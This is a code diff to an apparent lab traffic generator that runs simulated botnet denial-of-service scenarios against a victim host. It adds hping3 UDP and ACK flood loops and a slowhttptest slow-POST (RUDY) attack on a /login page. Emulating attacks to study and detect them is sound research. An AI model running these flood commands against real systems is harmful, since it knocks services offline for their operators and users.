@@ -30,13 +30,16 @@ from roles import (
     BROWSE_PAUSE_MIN,
     C2_NAME,
     CORE_SWITCH,
+    ACK_PPS,
     HTTP_FLOOD_PAUSE,
     HTTP_FLOOD_WORKERS,
     ICMP_PPS,
     PAGES,
     SCENARIOS,
     SLOWLORIS_CONNS,
+    SLOWPOST_CONNS,
     SYN_PPS,
+    UDP_PPS,
     VICTIM_IP,
     VICTIM_NAME,
     bots,
@@ -104,6 +107,20 @@ while true; do
   timeout 5 ping -i %s -q %s >/dev/null 2>&1
 done
 ''' % (icmp_interval, victim))
+    # UDP y ACK: mismo patron de bucle con timeout que SYN/ICMP, por la
+    # misma razon (hping3 puede dejar de empujar paquetes si no se relanza).
+    _write_script('/tmp/udpfloodloop.sh', '''#!/bin/sh
+while true; do
+  : udpflood
+  timeout 5 hping3 --udp -p 80 %s %s >/dev/null 2>&1
+done
+''' % (_hping_flag(UDP_PPS), victim))
+    _write_script('/tmp/ackfloodloop.sh', '''#!/bin/sh
+while true; do
+  : ackflood
+  timeout 5 hping3 -A -p 80 %s %s >/dev/null 2>&1
+done
+''' % (_hping_flag(ACK_PPS), victim))
 
 
 def _hping_flag(pps):
@@ -137,6 +154,20 @@ def start_attack(host, scenario, victim, duration):
         )
     elif scenario == 'icmpflood':
         host.cmd('sh /tmp/icmpfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
+    elif scenario == 'udpflood':
+        host.cmd('sh /tmp/udpfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
+    elif scenario == 'ackflood':
+        host.cmd('sh /tmp/ackfloodloop.sh > /tmp/%s.attack.log 2>&1 &' % host.name)
+    elif scenario == 'slowpost':
+        # RUDY: igual que Slowloris pero en el cuerpo de un POST (-B), no en
+        # las cabeceras (-H). Va contra /login, el unico path que el portal
+        # acepta en POST (webserver.py); contra otro path el 404 llega antes
+        # de que el cuerpo lento tenga efecto, y la conexion no se sostiene.
+        host.cmd(
+            'slowhttptest -c %d -B -i 10 -r 20 -u http://%s/login -x 24 -p 3 -l %d '
+            '> /tmp/%s.attack.log 2>&1 &'
+            % (SLOWPOST_CONNS, victim, duration + 15, host.name)
+        )
 
 
 def stop_host(host):
@@ -144,6 +175,8 @@ def stop_host(host):
     host.cmd('pkill -f httpflood.sh 2>/dev/null || true')
     host.cmd('pkill -f synfloodloop.sh 2>/dev/null || true')
     host.cmd('pkill -f icmpfloodloop.sh 2>/dev/null || true')
+    host.cmd('pkill -f udpfloodloop.sh 2>/dev/null || true')
+    host.cmd('pkill -f ackfloodloop.sh 2>/dev/null || true')
     host.cmd('pkill -f hping3 2>/dev/null || true')
     host.cmd('pkill -f slowhttptest 2>/dev/null || true')
 
